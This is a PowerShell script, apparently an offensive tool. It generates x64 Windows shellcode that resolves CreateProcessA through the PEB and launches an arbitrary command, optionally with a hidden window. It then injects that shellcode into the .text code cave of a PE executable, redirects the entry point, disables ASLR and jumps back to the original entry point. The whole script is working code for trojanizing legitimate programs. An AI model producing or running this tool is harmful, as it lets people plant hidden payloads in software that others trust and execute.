# Config
param(
    # In/Out files for the injector (injectshc)
    [string]$inputFile = "$pwd\in.exe",
    [string]$outputFile = "$pwd\out.exe",

    # Config CreateProcessA generator (genshc)
    [string]$call = "notepad",
    [switch]$hideWindow,

    # Output switches
    [switch]$verbose = $false,
    [switch]$silent = $false,

    # Standalone
    [switch]$genshc,
    [switch]$toClipboard,
    [switch]$toOutput,

    [switch]$injectshc,
    [string]$binFile
)

$isVerbose = $verbose -and !$silent
$isSilent = $silent -or $toOutput
$standalone = $genshc -or $injectshc

$scriptName = $MyInvocation.MyCommand.Name

# Methods | Console
function conwrite {
    param(
        [bool]$do = $true,
        [string]$name = "---",
        [string]$msg,
        [string]$data,
        [ConsoleColor]$nameColor = 'Yellow',
        [ConsoleColor]$msgColor = 'White',
        [ConsoleColor]$dataColor = 'Gray'
    )

    if (-not $do) {return}

    $hasData = -not [string]::IsNullOrWhiteSpace($data)

    Write-Host "(" -fore $dataColor -NoNewline
    Write-Host "$($name.ToUpper())" -fore $nameColor -NoNewline
    Write-Host ") " -fore $dataColor

    Write-Host "| Msg: " -fore $dataColor -NoNewline
    Write-Host "$msg" -fore $msgColor

    if ($hasData) {
        Write-Host "{ " -fore $dataColor
        Write-Host "$data" -fore $dataColor
        Write-Host "}" -fore $dataColor    
    }
}

# Methods | Format
function prettyBytes {
    param(
        [byte[]]$bytes
    )

    return "0x$(($bytes | ForEach-Object { '{0:X2}' -f $_ }) -join ', 0x')"
}

# Methods | Shellcode
function genshc {
    param(
        [string]$call = "notepad",
        [bool]$hide = $false,
        [switch]$verbose,
        [switch]$silent
    )

    # Setup | Debug
    $dbgName = $MyInvocation.MyCommand.Name

    # Setup | CreateProcessA
    $header = [byte[]]@(
        0x48, 0x31, 0xC9, 0x65, 0x48, 0x8B, 0x41, 0x60, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x20, 
        0x48, 0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x58, 0x20, 0x31, 0xC0, 0x8B, 0x43, 0x3C, 0x48, 
        0x01, 0xD8, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xD8, 0x48, 0x89, 0xC6, 0x31, 0xC0, 
        0x8B, 0x46, 0x20, 0x48, 0x01, 0xD8, 0x49, 0x89, 0xC1, 0x48, 0x31, 0xC9, 0x48, 0xFF, 0xC9, 0x49, 
        0xBA, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x48, 0xFF, 0xC1, 0x31, 0xC0, 0x41, 0x8B, 
        0x04, 0x89, 0x48, 0x01, 0xD8, 0x4C, 0x39, 0x10, 0x75, 0xEF, 0x31, 0xC0, 0x8B, 0x46, 0x24, 0x48, 
        0x01, 0xD8, 0x0F, 0xB7, 0x0C, 0x48, 0x31, 0xC0, 0x8B, 0x46, 0x1C, 0x48, 0x01, 0xD8, 0x8B, 0x04, 
        0x88, 0x48, 0x01, 0xD8, 0x48, 0x89, 0xC7, 0x48, 0x31, 0xC0, 0x50, 0x48, 0xB8, 0x6F, 0x63, 0x65, 
        0x73, 0x73, 0x41, 0x00, 0x00, 0x50, 0x48, 0xB8, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 
        0x50, 0x48, 0x89, 0xE2, 0x48, 0x89, 0xD9, 0x48, 0x83, 0xEC, 0x28, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 
        0x28, 0x48, 0x83, 0xC4, 0x18, 0x49, 0x89, 0xC7
    )

    $showCon = if ($hide) { 0x00 } else { 0x05 }

    conwrite -do $verbose -name $dbgName -msg "Created CreateProcessA setup header:" -data "$(prettyBytes($header))"

    # Footer | Re-aligned structure handling
    $footer = [byte[]]@(
        0x48, 0x31, 0xC0, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 
        0x50, 0x50, 0x50, 0x50, 0x50, 
        0xC7, 0x44, 0x24, 0x20, 0x68, 0x00, 0x00, 0x00, 
        0xC7, 0x44, 0x24, 0x5C, 0x01, 0x00, 0x00, 0x00, 
        0x66, 0xC7, 0x44, 0x24, 0x60, $showCon, 0x00,    
        0x4C, 0x8D, 0x64, 0x24, 0x20, 0x4C, 0x8D, 0x2C, 0x24, 0x48, 0x83, 0xEC, 0x50, 0x48, 0x31, 0xC0, 
        0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 
        0x89, 0x44, 0x24, 0x38, 0x4C, 0x89, 0x64, 0x24, 0x40, 0x4C, 0x89, 0x6C, 0x24, 0x48, 0x48, 0x31, 
        0xC9, 0x4C, 0x89, 0xF2, 0x4D, 0x31, 0xC0, 0x4D, 0x31, 0xC9, 0x41, 0xFF, 0xD7, 
        0x48, 0x83, 0xC4, 0x50
    )

    conwrite -do $verbose -msg "Created footer with call instructions:" -data "$(prettyBytes($footer))"

    # Chunking
    $nullTerminated = $call + "`0"
    while ($nullTerminated.Length % 8 -ne 0) { $nullTerminated += " " }
    $chunks = New-Object System.Collections.Generic.List[string]
    for ($i = 0; $i -lt $nullTerminated.Length; $i += 8) { $chunks.Add($nullTerminated.Substring($i, 8)) }

    $stringBytes = @()
    for ($i = $chunks.Count - 1; $i -ge 0; $i--) {
        $stringBytes += 0x48, 0xB8 
        $charArray = $chunks[$i].ToCharArray()
        for ($j = 0; $j -lt 8; $j++) { $stringBytes += [int]$charArray[$j] }
        $stringBytes += 0x50 
    }
    $stringBytes += 0x49, 0x89, 0xE6

    conwrite -do $verbose -msg "Calculated chunks"

    # Polish | Compensation and cleanup
    $extraBytes = ($chunks.Count - 1) * 8
    $compensation = if ($extraBytes -gt 0) { @(0x48, 0x81, 0xEC) + [System.BitConverter]::GetBytes([uint32]$extraBytes) } else { @() }

    $totalCleanup = 0x90 + 8 * (2 * $chunks.Count - 1)

    $cleanupBytes = [System.BitConverter]::GetBytes([uint32]$totalCleanup)
    $finalCleanup = @(0x48, 0x81, 0xC4) + $cleanupBytes

    $shellcode = $header + $stringBytes + $compensation + $footer + $finalCleanup

    conwrite -do $verbose -msg "Calculated extra bytes and cleaning up"

    # Return
    $finalshc = [byte[]]$shellcode

    conwrite -do $verbose -msg "Finalized shellcode:" -data "$(prettyBytes($finalshc))"
    conwrite -do (-not $silent) -name "/$dbgName" -msg "Custom CreateProcessA shellcode assembled to invoke `"$call`""

    return $finalshc
}

function injectshc {
    param (
        [string]$in,
        [string]$out,
        [byte[]]$shellcode,
        [switch]$verbose,
        [switch]$silent
    )

    # Setup | Debug
    $dbgName = $MyInvocation.MyCommand.Name

    # Setup | File
    $bytes = [System.IO.File]::ReadAllBytes($in)

    conwrite -do $verbose -name $dbgName -msg "Read all bytes from [$in]"
    
    # Setup | PE Header offsets
    $e_lfanew = [BitConverter]::ToUInt32($bytes, 0x3C)
    $sizeOfOptionalHeader = [BitConverter]::ToUInt16($bytes, $e_lfanew + 0x14)
    $sectionTableOffset = $e_lfanew + 0x18 + $sizeOfOptionalHeader

    $dbgHeaderOffsets = @"
    e_lfanew [$($e_lfanew.ToString("X8"))]
    | [uint16] Size of optional header: + 0x14: $($sizeOfOptionalHeader.ToString("X8")) 
    | Section table offset: + 0x18 + $($sizeOfOptionalHeader.ToString("X8")): $($sectionTableOffset.ToString("X8"))
"@

    conwrite -do $verbose -msg "Setup PE header offsets:" -data $dbgHeaderOffsets

    # Setup | .text section
    $textHeaderOffset = $sectionTableOffset
    $textVSize = [BitConverter]::ToUInt32($bytes, $textHeaderOffset + 0x08)
    $textVAddr = [BitConverter]::ToUInt32($bytes, $textHeaderOffset + 0x0C)
    $textRawSize = [BitConverter]::ToUInt32($bytes, $textHeaderOffset + 0x10)
    $textRawAddr = [BitConverter]::ToUInt32($bytes, $textHeaderOffset + 0x14)

    $dbgText = @"
    .text [$($textHeaderOffset.ToString("X8"))]
    | Virtual Size: $($textVSize.ToString("X8"))
    | Virtual Address: $($textVAddr.ToString("X8"))
    | Raw Size: $($textRawSize.ToString("X8"))
    | Raw Address: $($textRawAddr.ToString("X8"))
"@

    conwrite -do $verbose -msg "Assumed .text as first section of sectionTable" -data $dbgText

    # Append | Jump back to Original Entry Point (OEP)
    $imageBase = [BitConverter]::ToUInt64($bytes, $e_lfanew + 0x30)
    $oep = [BitConverter]::ToUInt32($bytes, $e_lfanew + 0x28)

    $absOEP = $imageBase + $oep

    $jumpBack = [byte[]] @(0x48, 0xB8) # mov rax, ...
    $jumpBack += [BitConverter]::GetBytes([uint64]$absOEP)
    $jumpBack += [byte[]] @(0xFF, 0xE0) # jmp rax

    $finalshc = $Shellcode + $jumpBack

    $dbgAbsOEP = @"
    Entry Point
    | [uint64] Image Base: e_lfanew + 0x30: $($imageBase.ToString("X8"))
    | [uint32] OEP: e_lfanew + 0x28: $($oep.ToString("X8"))
    | Absolute OEP: Image Base + OEP: $($absOEP.ToString("X8"))
"@

    conwrite -do $verbose -msg "Calculated absolute OEP to jump back to. Appended simple 'jmp' instruction" -data $dbgAbsOEP

    # Disable DLL can move (Dynamic Base) in DLLCharacteristics to properly resolve absolute OEP (absOEP)
    $dllCharsOffset = $e_lfanew + 0x5E
    $cDllChars = [BitConverter]::ToUInt16($bytes, $dllCharsOffset)
    $nDllChars = $cDllChars -band -bnot 0x0040

    [BitConverter]::GetBytes([uint16]$nDllChars).CopyTo($bytes, $dllCharsOffset) # Replace

    $dbgCharsOffset = @"
    DLLCharacteristics [$($dllCharsOffset.ToString("X8"))]
    | [uint16] Old DLLChars: $cDllChars
    | New DLLChars: Old DLL Chars - 0x0040 (Dynamic Base flag): $nDllChars
"@

    conwrite -do $verbose -msg "Updated DLLCharacteristics with DYNAMIC_BASE disabled. Allows proper resolve of absolute OEP" -data $dbgCharsOffset

    # Calc | Free bucket space to inject shellcode
    $injectionRawOffset = $textRawAddr + $textVSize
    $newEntryPointRVA = $textVAddr + $textVSize

    if (($textVSize + $finalshc.Length) -gt $textRawSize) {
        Write-Error "Not enough free space in .text codecave"
        return
    }

    conwrite -do $verbose -msg "Calculated raw offset to insert shellcode at: .text rawAddr + .text vSize: $($injectionRawOffset.ToString("X8"))"
    conwrite -do $verbose -msg "Calculated new entry point RVA: .text vAddr + .text vSize: $($newEntryPointRVA.ToString("X8"))"

    # Update | .text virtual size
    $newVSize = $textVSize + $finalshc.Length
    [BitConverter]::GetBytes([uint32]$newVSize).CopyTo($bytes, $textHeaderOffset + 0x08)

    conwrite -do $verbose -msg "Updated .text virtual size with shellcode bytes: textVSize ($textVSize) + shellcodeLength ($($finalshc.Length)): $newVSize"

    # Update | Entry point RVA
    [BitConverter]::GetBytes([uint32]$newEntryPointRVA).CopyTo($bytes, $e_lfanew + 0x28)

    conwrite -do $verbose -msg "Updated entry point RVA (e_lfanew + 0x28) with new entry point RVA: $($newEntryPointRVA.ToString("X8"))"

    # Write | Shellcode into the codecave
    [Array]::Copy($finalshc, 0, $bytes, $injectionRawOffset, $finalshc.Length)

    conwrite -do $verbose -msg "Wrote final shellcode to bytes at raw injection offset: $($injectionRawOffset.ToString("X8"))"

    # --- 6. Save File ---
    [System.IO.File]::WriteAllBytes($out, $bytes)
    conwrite -do (-not $silent) -name "/$dbgName" -msg "Wrote modified PE bytes to output file [$out]"
}

# Setup | Shellcode
$shc = [byte[]]@()
if (!$standalone -or $genshc) {
    $shc = (genshc -call $call -hide $hideWindow -verbose:$isVerbose -silent:$isSilent) # Generate CreateProcessA shellcode to invoke $call
}

# Execute
if (!$standalone) {
    # Patch PE file with generated shellcode
    injectshc -in $inputFile -shell $shc -out $outputFile -verbose:$isVerbose -silent:$isSilent
} elseif ($genshc) {
    if ($toClipboard) {
        "$(prettyBytes($shc))" | Set-Clipboard
    } elseif ($toOutput) {
        return ,[Byte[]]$shc
    } else {
        [System.IO.File]::WriteAllBytes($outputFile, $shc)
    }
} elseif ($injectshc -and !([string]::IsNullOrWhiteSpace($binFile))) {
    $shc = [System.IO.File]::ReadAllBytes($binFile)
    injectshc -in $inputFile -shell $shc -out $outputPath -verbose:$isVerbose -silent:$isSilent
}

# Report
conwrite -do (-not $isSilent) -name $scriptName -msg "Finished" -msgColor Cyan